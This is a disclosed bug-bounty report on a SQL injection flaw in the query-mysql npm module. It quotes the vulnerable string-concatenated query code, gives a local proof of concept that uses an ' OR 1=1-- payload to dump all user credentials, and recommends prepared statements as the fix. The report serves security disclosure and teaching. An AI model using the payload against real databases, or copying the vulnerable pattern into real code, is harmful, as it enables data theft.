# [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database

## Report Details
- **Report ID**: 311244
- **URL**: https://hackerone.com/reports/311244
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-02-01T00:58:42.031Z
- **Disclosed**: 2018-05-19T12:53:02.893Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.

## Module

**query-mysql**

Install this module in your project like dependency

https://www.npmjs.com/package/query-mysql

version: 0.0.2

Stats
0 downloads in the last day
13 downloads in the last week
85 downloads in the last month

~1000 estimated downloads per year


## Description

Most of functions in ```query-mysql``` module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.

This is one of those functions, which allows to select record from the table depends on value for the column:

```javascript
// node_modules/query-mysql/lib/base.js, line 172
    fetchById: function (table, id, name_id, callback) {
        connect(function (connected) {
            if (connected) {

                connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'", function (err, rows, fields) {
                    connection.end();
                    console.log("fetchById");
                    //if (err) throw err;
                    if (err) {
                        callback("error", null);
                    }else{						
                        callback("success", rows);
                    };
                })

            }else{
                callback("error_connection", null);
            };
        })
    },
```

The query itself is simple string with values passed by the user concatenated with SQL:

```javascript
connection.query("SELECT * FROM " + table + " WHERE " +name_id+"='"+ id+"'"
```

If we assume, that ```table```, ```name_id``` and ```id``` will be passed as, respectively, ```users```, ```id``` and ```1```, we should get following query:

```sql
SELECT * FROM users WHERE id='1'
```
It returns record from table ```users```, where ```id``` equals 1.

Now, if we pass in ```id``` malicious query, like ```1\' OR 1=1-- ``` - we get this:

```sql
SELECT * FROM users WHERE id='1' OR 1=1-- 
```
This query returns **all** records from table ```users```


## Mitigation

```query-mysql``` relies on ```mysql``` module. This module allows to use Preparing Queries (Prepared Statements) - https://www.npmjs.com/package/mysql#preparing-queries:

```
You can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:

var sql = "SELECT * FROM ?? WHERE ?? = ?";
var inserts = ['users', 'id', userId];
sql = mysql.format(sql, inserts);

Following this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As 
```

This is the simplest way to avoid simple SQL Injection vulnerabilites.

## Steps To Reproduce:

- install ```query-mysql``` module:

```
$ npm install query-mysql
```

- log in to your local MySQL instance and create database ```test``` using following SQL:

```sql
-- Table structure for table `users`

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `username` varchar(50) DEFAULT NULL,
  `password` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
```

- populate data by adding couple of records:

```
mysql> select * from users;
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| user     | user     |
| noob     | noob     |
+----------+----------+
3 rows in set (0.00 sec)
```


- create sample application:

```javascript
// app.js
'use strict'

const query = require('query-mysql')

query.configure({
  'host': '127.0.0.1',
  'user': 'root',
  'password': 'root',
  'database': 'test'
})

query.base.fetchById('users', 'noob', 'username', (msg, res) => {
  console.log(msg, res)
})
```

- run application:

```
$ node app.js
```

- result:

```
fetchById
success [ RowDataPacket { username: 'noob', password: 'noob' } ]
```

- Now, modify query into following one:

```javascript
// app.js
//... cut for readibility
query.base.fetchById('users', 'noob\' or 1=1-- ', 'username', (msg, res) => {
  console.log(msg, res)
})
```

- run application again:

```
$ node app.js
```

- this time result set contains all records from table ```users```:

```
fetchById
success [ RowDataPacket { username: 'admin', password: 'admin' },
  RowDataPacket { username: 'user', password: 'user' },
  RowDataPacket { username: 'noob', password: 'noob' } ]
```

Other functions in ```query-mysql``` module contains the same vulnerability. 

## Supporting Material/References:


- macOS 10.13.3
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.3
- npm version: 5.5.1
- mysql  Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to fetch/manipulate data in database

## Attachments
No attachments
